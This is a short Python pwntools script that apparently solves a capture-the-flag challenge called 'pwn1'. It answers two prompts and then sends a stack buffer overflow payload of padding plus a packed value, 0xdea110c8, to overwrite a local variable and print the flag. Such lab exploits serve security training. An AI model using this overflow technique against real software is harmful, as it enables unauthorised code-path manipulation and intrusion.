from pwn import *
context.log_level = 'critical'
p = process("./pwn1")
# gdb.attach(p, gdbscript='break *0x566308a6')
(p.recvuntil('name?\n'))
p.sendline('Sir Lancelot of Camelot')
(p.recvuntil("quest?\n"))
p.sendline('To seek the Holy Grail.')
(p.recvuntil('secret?\n'))
target = 0xdea110c8
offset = 0x43-0x18
payload = b'A'*offset
payload += p32(target)
print(payload)
p.sendline(payload)
p.recvline()
flag = re.findall('flag{.*' , p.recvline().decode())
print(flag[0])
'''
Target to overwrite ebp-0x10
Input is at EBP + -0x3b
'''
